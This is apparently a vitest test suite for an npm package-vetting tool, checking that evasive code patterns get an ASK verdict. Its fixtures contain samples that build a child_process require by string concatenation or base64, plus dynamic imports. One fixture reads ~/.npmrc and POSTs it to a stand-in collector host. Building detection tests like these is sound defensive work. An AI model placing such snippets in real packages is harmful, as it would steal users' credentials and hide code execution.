import { describe, expect, it } from "vitest";
import { runVet } from "../../src/commands/vet.ts";
import type { EvaluationReport } from "../../src/core/types.ts";
import type { FixturePackage } from "./helpers/fixtures.ts";
import { withHarness } from "./helpers/harness.ts";

/**
 * Adversarial security suite (#45): audit-report evasion shapes that must
 * never end at ALLOW.
 *
 * - §15.3 dynamic require (string concatenation)        → ASK (#40)
 * - §15.4 encoded payload (base64-decoded require)      → ASK (#40)
 * - §15.5 dynamic import of a computed/variable module  → ASK (#40)
 * - §15.6 credential read combined with an outbound URL → ASK (update
 *   scenario; the install-scenario downgrade of direct credential hits
 *   predates #41 — see the static scanner's behavior-change-first design)
 * - §15.7 transitive risk never silently downgraded     → ASK (#41)
 * - §15.1/§15.2 (TOCTOU swap, tampered baseline) are covered by the
 *   fail-closed suite in fail-closed.e2e.test.ts (#36/#39); not duplicated.
 */

function byName(reports: EvaluationReport[], name: string): EvaluationReport | undefined {
  return reports.find((r) => r.candidate.name === name);
}

describe("e2e: adversarial detection (audit report §15)", () => {
  it.each([
    [
      "string-concatenation require (§15.3)",
      'module.exports = require(["child", "_process"].join(""));\n',
    ],
    [
      "base64-encoded require payload (§15.4)",
      'module.exports = require(Buffer.from("Y2hpbGRfcHJvY2Vzcw==", "base64").toString());\n',
    ],
    ["dynamic variable import (§15.5)", "module.exports = import(loadedModule);\n"],
    ["literal-concatenation require (§15.3)", 'module.exports = require("child" + "_process");\n'],
    ["computed dynamic import (§15.5)", 'module.exports = import(getUrl() + ".js");\n'],
  ])("asks on %s", async (_label, content) => {
    const pkg: FixturePackage = {
      name: "adversarial-pkg",
      versions: [{ version: "1.0.0", files: [{ path: "index.js", content }] }],
    };
    await withHarness({ fixtures: [pkg] }, async ({ deps }) => {
      const { reports } = await runVet(deps, "npm:adversarial-pkg");
      const report = byName(reports, "adversarial-pkg");
      expect(report?.verdict).toBe("ASK");
      expect(report?.findings.map((f) => f.ruleId)).toContain("dynamic-code-execution");
    });
  });

  it("asks when a new credential read ships with a new outbound endpoint (§15.6)", async () => {
    const pkg: FixturePackage = {
      name: "exfil-pkg",
      versions: [
        { version: "1.0.0", files: [{ path: "index.js", content: "module.exports = 1;\n" }] },
        {
          version: "1.1.0",
          files: [
            {
              path: "index.js",
              content:
                'const rc = require("fs").readFileSync(require("os").homedir() + "/.npmrc");\nfetch("https://collect.example.com/ingest", { method: "POST", body: rc });\n',
            },
          ],
        },
      ],
    };
    await withHarness(
      {
        fixtures: [pkg],
        installed: [
          {
            source: "npm:exfil-pkg",
            name: "exfil-pkg",
            version: "1.0.0",
            pinned: false,
            scope: "user" as const,
          },
        ],
      },
      async ({ deps }) => {
        const { reports } = await runVet(deps, "npm:exfil-pkg");
        const report = byName(reports, "exfil-pkg");
        expect(report?.verdict).toBe("ASK");
        const rules = report?.findings.map((f) => f.ruleId) ?? [];
        expect(rules).toContain("credential-access");
        expect(rules).toContain("new-network-endpoint");
      },
    );
  });

  it("never downgrades dynamic code execution inside a transitive dependency (§15.7)", async () => {
    const host: FixturePackage = {
      name: "transitive-host",
      versions: [
        { version: "1.0.0", files: [{ path: "index.js", content: "module.exports = 1;\n" }] },
        {
          version: "1.1.0",
          files: [{ path: "index.js", content: "module.exports = 2;\n" }],
          dependencies: { "nested-dep": "^1.0.0" },
        },
      ],
    };
    const nested: FixturePackage = {
      name: "nested-dep",
      versions: [
        {
          version: "1.0.0",
          files: [
            {
              path: "index.js",
              content: 'module.exports = new Function(process.env.HOOK_URL, "return 1");\n',
            },
          ],
        },
      ],
    };
    await withHarness(
      {
        fixtures: [host, nested],
        installed: [
          {
            source: "npm:transitive-host",
            name: "transitive-host",
            version: "1.0.0",
            pinned: false,
            scope: "user" as const,
          },
        ],
      },
      async ({ deps }) => {
        const { reports } = await runVet(deps, "npm:transitive-host");
        const report = byName(reports, "transitive-host");
        expect(report?.verdict).toBe("ASK");
        expect(report?.findings.map((f) => f.ruleId)).toContain("transitive-risk");
        const hit = report?.evidences.find((e) => e.key === "static:dependency-risk");
        expect(hit?.detail).toContain("nested-dep@1.0.0");
        expect(hit?.detail).toContain("eval");
      },
    );
  });
});
